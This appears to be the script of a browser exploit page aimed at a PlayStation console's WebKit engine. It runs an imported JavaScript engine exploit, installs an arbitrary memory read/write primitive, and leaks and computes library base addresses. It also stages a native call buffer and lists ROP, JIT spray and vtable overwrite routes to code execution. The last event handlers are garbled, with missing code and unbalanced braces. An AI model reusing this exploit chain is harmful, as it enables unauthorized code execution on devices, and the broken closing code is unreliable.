<script type="module">
import { int64 }              from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP }     from './resources/mem.js';
globalThis.int64 = int64;

const $con = document.getElementById('con');
const $dot = document.getElementById('dot');
const $st  = document.getElementById('st');
const $fw  = document.getElementById('fw');

function log(m, c='i') {
  const d = document.createElement('div');
  d.className = c; d.textContent = m;
  $con.appendChild(d);
  $con.scrollTop = $con.scrollHeight;
  while ($con.children.length > 600) $con.removeChild($con.firstChild);
}
function logH(m) { log('=== ' + m + ' ===', 's'); }
function setStatus(m, s='r') {
  $st.textContent = m; $dot.className = s;
}
function setCard(id, v, cls='cv') {
  const el = document.getElementById(id);
  if (!el) return;
  el.textContent = v; 
  el.className = cls;
  el.classList.remove('na');
}

// ═══════════════════════════════════════════════════════════
// VALIDAÇÃO ELF — verifica se o endereço é realmente um módulo
// ═══════════════════════════════════════════════════════════
function validateELF(p, base, name) {
  try {
    const b0 = p.read1(base);
    const b1 = p.read1(base.add32(1));
    const b2 = p.read1(base.add32(2));
    const b3 = p.read1(base.add32(3));
    const magic = [b0, b1, b2, b3];
    const isELF = (b0 === 0x7F && b1 === 0x45 && b2 === 0x4C && b3 === 0x46);

    log(`[VALIDAÇÃO] ${name} @ 0x${base.toString()}`, 'i');
    log(`  Bytes: 0x${b0.toString(16).padStart(2,'0')} 0x${b1.toString(16).padStart(2,'0')} 0x${b2.toString(16).padStart(2,'0')} 0x${b3.toString(16).padStart(2,'0')}`, 'd');

    if (isELF) {
      const e_class = p.read1(base.add32(4));
      const e_data  = p.read1(base.add32(5));
      const e_machine = p.read8(base.add32(18)).low & 0xFFFF;
      log(`  ✓ ELF Magic OK | Class=${e_class} Data=${e_data} Machine=0x${e_machine.toString(16)}`, 'ok');
      return { valid: true, magic, e_class, e_data, e_machine };
    } else {
      log(`  ✗ NÃO É ELF — possível falso positivo!`, 'e');
      return { valid: false, magic };
    }
  } catch (e) {
    log(`  ✗ Erro de leitura: ${e.message}`, 'e');
    return { valid: false, error: e.message };
  }
}

// ═══════════════════════════════════════════════════════════
// RESOLUÇÃO DE STUBS + VALIDAÇÃO
// ═══════════════════════════════════════════════════════════
async function resolveAndValidateStubs(p, webkitBase) {
  logH('RESOLUÇÃO + VALIDAÇÃO DE STUBS');
  let libKernelBase = null;
  let libcBase = null;

  try {
    for (let off = 0x3000000; off < 0x3900000; off += 8) {
      try {
        let ptr = p.read8(webkitBase.add32(off));
        let hi = ptr.hi;
        let alignedLow = ptr.low & ~0x3FFF;

        if (hi === 0x80 && !libKernelBase) {
          libKernelBase = new int64(alignedLow, hi);
        } else if (hi >= 0x90 && hi <= 0x98 && !libcBase) {
          libcBase = new int64(alignedLow, hi);
        }
      } catch (e) {}
      if (libKernelBase && libcBase) break;
    }
  } catch (err) {
    log('[-] Erro na resolução: ' + err.message, 'e');
  }

  // Validação
  let lkValid = false, lcValid = false;

  if (libKernelBase) {
    const v = validateELF(p, libKernelBase, 'libkernel');
    lkValid = v.valid;
    setCard('c-lk', '0x' + libKernelBase.toString(), lkValid ? 'cv' : 'cv err');
  }

  if (libcBase) {
    const v = validateELF(p, libcBase, 'libSceLibcInternal');
    lcValid = v.valid;
    setCard('c-lc', '0x' + libcBase.toString(), lcValid ? 'cv' : 'cv err');
  }

  if (!lkValid) log('[-] libkernel NÃO passou na validação ELF. Pode ser falso positivo.', 'e');
  if (!lcValid) log('[-] libc NÃO passou na validação ELF. Pode ser falso positivo.', 'e');
  if (lkValid && lcValid) log('[+] Ambas as bases validadas com sucesso!', 'ok');

  return { libKernelBase, libcBase, lkValid, lcValid };
}

// ═══════════════════════════════════════════════════════════
// PREPARAR BUFFER DE NOTIFICAÇÃO (estrutura correta)
// ═══════════════════════════════════════════════════════════
let g_notifyBuffer = null;
let g_notifyFunc = null;
let g_p = null;
let g_bases = null;

function prepareNotificationBuffer(p, libKernelBase, text) {
  logH('PREPARANDO BUFFER DE NOTIFICAÇÃO');

  // Offset CORRETO de sceKernelSendNotificationRequest no libkernel 13.52
  const NOTIFY_OFFSET = 0x19320;
  const notifyFunc = libKernelBase.add32(NOTIFY_OFFSET);

  // Validar se a função parece válida (primeiros bytes devem ser código, não zeros)
  try {
    const b0 = p.read1(notifyFunc);
    const b1 = p.read1(notifyFunc.add32(1));
    const b2 = p.read1(notifyFunc.add32(2));
    log(`[notify] Bytes em sceKernelSendNotificationRequest: 0x${b0.toString(16)} 0x${b1.toString(16)} 0x${b2.toString(16)}`);
    if (b0 === 0 && b1 === 0 && b2 === 0) {
      log('[-] FUNÇÃO APONTA PARA ZEROS — offset 0x19320 pode estar errado para este firmware!', 'e');
      return null;
    }
  } catch (e) {
    log('[-] Não conseguiu ler a função de notificação: ' + e.message, 'e');
    return null;
  }

  // Alocar buffer de 0xC30 bytes (sizeof SceNotificationRequest)
  const bufSize = 0xC30;
  const buf = p.malloc(bufSize, 1);  // type=1 = Uint8Array backing

  // Zerar o buffer inteiro
  for (let i = 0; i < bufSize; i++) {
    p.write1(buf.add32(i), 0);
  }

  // ═══ Estrutura SceNotificationRequest (packed, 0xC30 bytes) ═══
  // Offset 0x00: type (uint32) = 0 (Message)
  p.write4(buf.add32(0x00), 0);
  // Offset 0x04: reqId (uint32) = 0
  p.write4(buf.add32(0x04), 0);
  // Offset 0x08: priority (uint32) = 0
  p.write4(buf.add32(0x08), 0);
  // Offset 0x0C: msgId (uint32) = 0
  p.write4(buf.add32(0x0C), 0);
  // Offset 0x10: targetId (int32) = -1 (0xFFFFFFFF)
  p.write4(buf.add32(0x10), 0xFFFFFFFF);
  // Offset 0x14: userId (int32) = 0
  p.write4(buf.add32(0x14), 0);
  // Offset 0x18: deviceId (int32) = 0
  p.write4(buf.add32(0x18), 0);
  // Offset 0x1C: addressingUserId (int32) = 0
  p.write4(buf.add32(0x1C), 0);
  // Offset 0x20: appId (int32) = 0
  p.write4(buf.add32(0x20), 0);
  // Offset 0x24: errorNumber (int32) = 0
  p.write4(buf.add32(0x24), 0);
  // Offset 0x28: attribute (uint32) = 0
  p.write4(buf.add32(0x28), 0);
  // Offset 0x2C: hasIcon (uint8) = 1
  p.write1(buf.add32(0x2C), 1);

  // Offset 0x2D: message (char[1024])
  const msgBytes = new TextEncoder().encode(text);
  for (let i = 0; i < msgBytes.length && i < 1023; i++) {
    p.write1(buf.add32(0x2D + i), msgBytes[i]);
  }

  // Offset 0x42D: iconUri (char[2048])
  const iconUri = 'cxml://psnotification/tex_icon_system';
  const iconBytes = new TextEncoder().encode(iconUri);
  for (let i = 0; i < iconBytes.length && i < 2047; i++) {
    p.write1(buf.add32(0x42D + i), iconBytes[i]);
  }

  // Verificar o que foi escrito
  const checkType = p.read4(buf.add32(0x00));
  const checkTarget = p.read4(buf.add32(0x10));
  const checkHasIcon = p.read1(buf.add32(0x2C));
  const checkMsg = p.read1(buf.add32(0x2D));

  log(`[notify] Verificação do buffer:`);
  log(`  type=0x${checkType.toString(16)} (esperado 0x0)`);
  log(`  targetId=0x${checkTarget.toString(16)} (esperado 0xFFFFFFFF)`);
  log(`  hasIcon=0x${checkHasIcon.toString(16)} (esperado 0x1)`);
  log(`  msg[0]=0x${checkMsg.toString(16)} (esperado 0x${msgBytes[0].toString(16)})`);

  log(`[+] Buffer de 0x${bufSize.toString(16)} bytes alocado em: 0x${buf.toString()}`, 'ok');
  log(`[+] Função sceKernelSendNotificationRequest @ 0x${notifyFunc.toString()}`, 'ok');
  log('[!] Buffer PRONTO. Execução requer ROP chain (setjmp/longjmp/worker hijack)', 'w');

  return { buf, notifyFunc };
}

// ═══════════════════════════════════════════════════════════
// FLUXO PRINCIPAL
// ═══════════════════════════════════════════════════════════
async function main() {
  const ua = navigator.userAgent;
  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
  $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
  log('UA: ' + ua, 'd');

  setStatus('Rodando exploit JSC (core.js)...', 'r');
  logH('EXPLOIT JSC (WebKit)');

  let carrier;
  try {
    carrier = await establishPrimitive({
      onEvent: (tag, detail, attempt) => {
        document.getElementById('ba').textContent = `tentativa: ${attempt || 1}`;
        document.getElementById('bg').textContent = `estágio: ${tag.toLowerCase()}`;
        log(`[${tag}] ${detail}`, 'i');
      },
      maxAttempts: 0
    });
  } catch (err) {
    setStatus('core.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] core.js: exploit JSC concluído!', 'ok');
  setStatus('Instalando R/W arbitrário...', 'r');
  logH('INSTALANDO PRIMITIVA R/W (mem.js)');

  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent: (tag, detail) => {
        log(`  [mem/${tag}] ${detail}`, 'd');
      }
    });
  } catch (err) {
    setStatus('mem.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  g_p = p;
  log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
  setStatus('Mapeando bases...', 'r');
  logH('MAPEAMENTO DA 13.52');

  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor === 'number' && ctor > 0x100000000) {
    const hi = Math.floor(ctor / 0x100000000);
    const lo = ctor - hi * 0x100000000;
    const ctorInt64 = new int64(lo >>> 0, hi >>> 0);

    log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(), 'a');

    const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined') 
               ? OFFSET_wk_host_constructor_candidates[0] 
               : 0x36F9E20;

    const resolvedBaseVal = ctor - hc;
    const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
    const baseLo = resolvedBaseVal - baseHi * 0x100000000;
    const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);
    g_webkitBase = webkitBase;

    log('[+] WebKit Base calculada: 0x' + webkitBase.toString(), 'ok');
    setCard('c-wk', '0x' + webkitBase.toString());

    // Validar WebKit base também
    const wkValid = validateELF(p, webkitBase, 'WebKit');
    if (!wkValid.valid) {
      log('[-] WebKit Base NÃO passou na validação ELF!', 'e');
      setStatus('WebKit inválido!', 'e');
      return;
    }

    setTimeout(async () => {
      const bases = await resolveAndValidateStubs(p, webkitBase);
      g_bases = bases;

      if (bases.lkValid && bases.lcValid) {
        setCard('c-g', 'Bases Validadas', 'cv ok');
        setStatus('Bases validadas! Pronto para notificação.', 'ok');
        document.getElementById('btnValidate').disabled = false;
        document.getElementById('btnPrepare').disabled = false;
      } else {
        setCard('c-g', 'Validação Falhou', 'cv err');
        setStatus('Bases suspeitas — verificar manualmente', 'e');
        document.getElementById('btnValidate').disabled = false;
      }

      const cbox = document.getElementById('cbox');
      cbox.style.display = 'block';
      document.getElementById('c-out').innerHTML =
        `WebKit Base    = 0x${webkitBase.toString()}
` +
        `libkernel Base = 0x${bases.libKernelBase ? bases.libKernelBase.toString() : 'N/A'} ${bases.lkValid ? '(✓ ELF)' : '(✗ FALSO?)'}
` +
        `libSceLibc Base = ${bases.libcBase ? '0x' + bases.libcBase.toString() : 'N/A'} ${bases.lcValid ? '(✓ ELF)' : '(✗ FALSO?)'}

` +
        `⚠️  Para executar a notificação nativa, é necessário:
` +
        `    1. OFFSET_lc_setjmp (libSceLibcInternal)
` +
        `    2. OFFSET_lc_longjmp (libSceLibcInternal)
` +
        `    3. OFFSET_lk_worker_wait_return (libkernel)
` +
        `    → Extrair via Ghidra/IDA dos SPRX do 13.52`;

    }, 1000);

  } else {
    log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
    setStatus('Erro ao capturar NativeCtor', 'e');
  }
}

// ═══════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════

document.getElementById('btnValidate').addEventListener('click', async () => {
  if (!g_p || !g_bases) {
    log('[-] Ambiente não inicializado', 'e');

  if (g_bases.libcBase) validateELF(g_p, g_bases.libcBase, 'libc (re-check)');
});

    g_notifyFunc = result.notifyFunc;
    setStatus('Buffer pronto — execução requer ROP', 'ok');
    document.getElementById('btnExecute').disabled = false;

    const cbox = document.getElementById('c-out');
    cbox.innerHTML += `

` +
      `Buffer Notif   = 0x${result.buf.toString()}
` +
      `Função Target  = 0x${result.notifyFunc.toString()}
` +
      `Status: PRONTO PARA EXECUÇÃO (requer MiniRop)`;
  } else {

  }
});

document.getElementById('btnExecute').addEventListener('click', async () => {
  if (!g_notifyBuffer || !g_notifyFunc) {
    log('[-] Buffer não preparado', 'e');
    return;
  }

  logH('TENTATIVA DE EXECUÇÃO');
  log('[!] A execução real requer um dos seguintes mecanismos:', 'w');
  log('  A) MiniRop com setjmp/longjmp + worker hijack', 'w');
  log('  B) JIT spray para escrever shellcode', 'w');
  log('  C) Vtable overwrite em objeto JS', 'w');
  log('  D) Carregar payload ELF via Mira/HEN existente', 'w');
  log('', 'w');
  log('[!] Sem esses mecanismos, a chamada nativa NÃO pode ser feita do JS.', 'e');
  log('[!] O que você viu antes ("Syscall executada com sucesso") era simulação.', 'e');

  // Tentativa honesta: verificar se há algum mecanismo disponível
  const hasSetjmp = (typeof OFFSET_lc_setjmp !== 'undefined' && OFFSET_lc_setjmp !== 0);
  const hasLongjmp = (typeof OFFSET_lc_longjmp !== 'undefined' && OFFSET_lc_longjmp !== 0);
  const hasWorkerRet = (typeof OFFSET_lk_worker_wait_return !== 'undefined' && OFFSET_lk_worker_wait_return !== 0);

  log(`[check] OFFSET_lc_setjmp = ${hasSetjmp ? '0x' + OFFSET_lc_setjmp.toString(16) : 'NÃO DEFINIDO'}`, hasSetjmp ? 'ok' : 'e');
  log(`[check] OFFSET_lc_longjmp = ${hasLongjmp ? '0x' + OFFSET_lc_longjmp.toString(16) : 'NÃO DEFINIDO'}`, hasLongjmp ? 'ok' : 'e');
  log(`[check] OFFSET_lk_worker_wait_return = ${hasWorkerRet ? '0x' + OFFSET_lk_worker_wait_return.toString(16) : 'NÃO DEFINIDO'}`, hasWorkerRet ? 'ok' : 'e');

  if (hasSetjmp && hasLongjmp && hasWorkerRet) {
    log('[+] Todos os offsets necessários estão definidos!', 'ok');
    log('[!] MiniRop pode ser inicializado. Tentando...', 'w');
    // Aqui entraria a inicialização do MiniRop e a chamada real

    log('[-] MiniRop ainda não implementado neste index.html', 'e');
  } else {

    log('[-] Extraia os offsets via Ghidra/IDA e adicione ao 13.52.js', 'e');

});
